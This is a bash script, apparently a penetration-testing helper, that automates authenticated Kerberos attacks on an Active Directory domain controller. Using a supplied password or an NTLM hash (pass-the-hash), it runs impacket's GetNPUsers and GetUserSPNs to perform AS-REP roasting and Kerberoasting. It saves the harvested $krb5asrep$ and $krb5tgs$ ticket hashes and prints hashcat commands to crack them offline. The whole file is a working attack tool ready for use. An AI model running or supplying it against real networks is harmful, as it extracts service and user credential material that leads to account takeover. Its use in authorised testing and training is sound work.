#!/usr/bin/env bash
# Author: strikoder
# File: auth_kerberos
# Usage: ./auth_kerberos [-u <USERNAME> -p <PASSWORD> | -u <USERNAME> -H <HASH>] -i <DC_IP> -d <DOMAIN>
#
# Purpose:
#   Authenticated Kerberos attacks:
#   - AS-REP roasting (with credentials)
#   - Kerberoasting (GetUserSPNs)
#
# Output:
#   results_auth_kerberos/<DOMAIN>_<timestamp>/ with results
#
set -euo pipefail

# Color definitions
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly CYAN='\033[0;36m'
readonly MAGENTA='\033[0;35m'
readonly NC='\033[0m' # No Color

# Parse arguments
USER=""
PASS=""
HASH=""
IP=""
DOMAIN=""

usage() {
  echo -e "${RED}[!] Usage: $0 -u <USERNAME> [-p <PASSWORD> | -H <HASH>] -i <DC_IP> -d <DOMAIN>${NC}" >&2
  echo "Example with password: $0 -u pete -p 'Password123' -i 192.168.105.70 -d corp.com"
  echo "Example with hash: $0 -u pete -H 'aad3b435b51404eeaad3b435b51404ee:64fbae31cc352fc26af97cbdef151e03' -i 192.168.105.70 -d corp.com"
  exit 1
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    -u) USER="$2"; shift 2 ;;
    -p) PASS="$2"; shift 2 ;;
    -H) HASH="$2"; shift 2 ;;
    -i) IP="$2"; shift 2 ;;
    -d) DOMAIN="$2"; shift 2 ;;
    *) usage ;;
  esac
done

# Validation
if [[ -z "$USER" || -z "$IP" || -z "$DOMAIN" ]]; then
  usage
fi

if [[ -z "$PASS" && -z "$HASH" ]]; then
  echo -e "${RED}[!] Must provide either -p <PASSWORD> or -H <HASH>${NC}" >&2
  usage
fi

if [[ -n "$PASS" && -n "$HASH" ]]; then
  echo -e "${RED}[!] Cannot use both -p and -H${NC}" >&2
  usage
fi

section_header() {
    local title="$1"
    local width=60
    local padding=$(( (width - ${#title} - 2) / 2 ))
    echo
    echo -e "${CYAN}$(printf '=%.0s' $(seq 1 $width))${NC}"
    echo -e "${CYAN}$(printf ' %.0s' $(seq 1 $padding))${title}${NC}"
    echo -e "${CYAN}$(printf '=%.0s' $(seq 1 $width))${NC}"
    echo
}

log_info() {
    echo -e "${BLUE}[*]${NC} $*"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $*"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $*"
}

log_error() {
    echo -e "${RED}[-]${NC} $*"
}

echo -e "${CYAN}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║         Authenticated Kerberos Attack Script              ║
║                   by strikoder                            ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo "Select mode:"
echo "  1) AS-REP roasting"
echo "  2) Kerberoasting"
echo "  3) Both attacks"
read -rp "Choice [1/2/3]: " MODE

echo ""
section_header "HINTS"
echo -e "${YELLOW}[!] Crack AS-REP hashes:${NC} hashcat -m 18200 hashes.txt wordlist.txt"
echo -e "${YELLOW}[!] Crack Kerberoast hashes:${NC} hashcat -m 13100 hashes.txt wordlist.txt"
echo -e "${YELLOW}[!] Extract hashes:${NC} grep '\$krb5' file.log > hashes.txt"
echo ""

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTDIR="results_auth_kerberos/${DOMAIN}_${TIMESTAMP}"
mkdir -p "$OUTDIR"

AUTH_TYPE="password"
[[ -n "$HASH" ]] && AUTH_TYPE="hash"

log_info "Output directory: ${MAGENTA}${OUTDIR}${NC}"
log_info "Target: DC=${MAGENTA}${IP}${NC} | Domain=${MAGENTA}${DOMAIN}${NC} | User=${MAGENTA}${USER}${NC} | Auth=${MAGENTA}${AUTH_TYPE}${NC}"
echo ""

# AS-REP Roasting
asrep_roast() {
  local LOGFILE="$OUTDIR/asrep_roasting.log"
  local HASHFILE="$OUTDIR/asrep_hashes.txt"
  
  section_header "AS-REP ROASTING"
  
  log_info "Searching for AS-REP roastable accounts..."
  echo ""
  
  if [[ -n "$HASH" ]]; then
    # Use hash authentication
    if impacket-GetNPUsers "$DOMAIN/$USER" -dc-ip "$IP" -hashes "$HASH" -request 2>&1 | tee "$LOGFILE"; then
      echo ""
      # Extract hashes
      if grep -q '\$krb5asrep\$' "$LOGFILE" 2>/dev/null; then
        grep '\$krb5asrep\$' "$LOGFILE" > "$HASHFILE"
        local COUNT=$(wc -l < "$HASHFILE")
        log_success "Found ${GREEN}${COUNT}${NC} AS-REP roastable account(s)"
        log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
      else
        log_warning "No AS-REP roastable accounts found"
      fi
    else
      log_error "AS-REP roasting failed - check credentials or connectivity"
    fi
  else
    # Use password authentication
    if impacket-GetNPUsers "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request 2>&1 | tee "$LOGFILE"; then
      echo ""
      # Extract hashes
      if grep -q '\$krb5asrep\$' "$LOGFILE" 2>/dev/null; then
        grep '\$krb5asrep\$' "$LOGFILE" > "$HASHFILE"
        local COUNT=$(wc -l < "$HASHFILE")
        log_success "Found ${GREEN}${COUNT}${NC} AS-REP roastable account(s)"
        log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
      else
        log_warning "No AS-REP roastable accounts found"
      fi
    else
      log_error "AS-REP roasting failed - check credentials or connectivity"
    fi
  fi
}

# Kerberoasting
kerberoast() {
  local LOGFILE="$OUTDIR/kerberoasting.log"
  local HASHFILE="$OUTDIR/kerberoast_hashes.txt"
  
  section_header "KERBEROASTING"
  
  log_info "Searching for Kerberoastable accounts (SPNs)..."
  echo ""
  
  if [[ -n "$HASH" ]]; then
    # Use hash authentication
    if impacket-GetUserSPNs "$DOMAIN/$USER" -dc-ip "$IP" -hashes "$HASH" -request 2>&1 | tee "$LOGFILE"; then
      echo ""
      # Extract hashes
      if grep -q '\$krb5tgs\$' "$LOGFILE" 2>/dev/null; then
        grep '\$krb5tgs\$' "$LOGFILE" > "$HASHFILE"
        local COUNT=$(wc -l < "$HASHFILE")
        log_success "Found ${GREEN}${COUNT}${NC} Kerberoastable account(s)"
        log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
      else
        log_warning "No Kerberoastable accounts found"
      fi
    else
      log_error "Kerberoasting failed - check credentials or connectivity"
    fi
  else
    # Use password authentication
    if impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request 2>&1 | tee "$LOGFILE"; then
      echo ""
      # Extract hashes
      if grep -q '\$krb5tgs\$' "$LOGFILE" 2>/dev/null; then
        grep '\$krb5tgs\$' "$LOGFILE" > "$HASHFILE"
        local COUNT=$(wc -l < "$HASHFILE")
        log_success "Found ${GREEN}${COUNT}${NC} Kerberoastable account(s)"
        log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
      else
        log_warning "No Kerberoastable accounts found"
      fi
    else
      log_error "Kerberoasting failed - check credentials or connectivity"
    fi
  fi
}

# Execute selected mode
case "$MODE" in
  1)
    asrep_roast
    ;;
  2)
    kerberoast
    ;;
  3)
    asrep_roast
    kerberoast
    ;;
  *)
    log_error "Invalid mode"
    exit 1
    ;;
esac

section_header "ENUMERATION SUMMARY"

log_success "Results saved to: ${GREEN}${OUTDIR}/${NC}"
echo ""

# Summary with counts
HAS_RESULTS=false
if [[ -f "$OUTDIR/asrep_hashes.txt" ]] && [[ -s "$OUTDIR/asrep_hashes.txt" ]]; then
  ASREP_COUNT=$(wc -l < "$OUTDIR/asrep_hashes.txt")
  log_success "AS-REP hashes: ${GREEN}${ASREP_COUNT} found${NC} → ${OUTDIR}/asrep_hashes.txt"
  HAS_RESULTS=true
fi

if [[ -f "$OUTDIR/kerberoast_hashes.txt" ]] && [[ -s "$OUTDIR/kerberoast_hashes.txt" ]]; then
  KERB_COUNT=$(wc -l < "$OUTDIR/kerberoast_hashes.txt")
  log_success "Kerberoast hashes: ${GREEN}${KERB_COUNT} found${NC} → ${OUTDIR}/kerberoast_hashes.txt"
  HAS_RESULTS=true
fi

if [[ "$HAS_RESULTS" = false ]]; then
  log_warning "No hashes found in this enumeration"
fi

echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "  → Crack AS-REP hashes: hashcat -m 18200 asrep_hashes.txt wordlist.txt"
echo "  → Crack Kerberoast hashes: hashcat -m 13100 kerberoast_hashes.txt wordlist.txt"
echo ""
